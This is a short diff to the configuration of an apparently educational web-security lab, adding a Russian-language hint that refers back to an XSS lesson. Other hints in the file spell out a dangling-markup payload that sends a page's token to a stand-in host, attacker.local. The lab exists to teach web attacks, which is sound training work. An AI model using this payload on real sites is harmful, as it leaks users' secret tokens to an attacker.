@@ -20,6 +20,7 @@ lab:
   files: [task.md]
   check: "grep -q 'nto{' found.txt"
   hints:
+    - "Повторение (`web-xss`): сначала `head -n 5 task.md` — вспомни приём из «XSS: отражённый, хранимый и DOM-based»."
     - 'Комментарии не экранируются.'
     - 'Оставь незакрытый тег: "><img src="//attacker.local/?leak='
     - 'Браузер поглотит следующий HTML (с токеном) в URL запроса.'
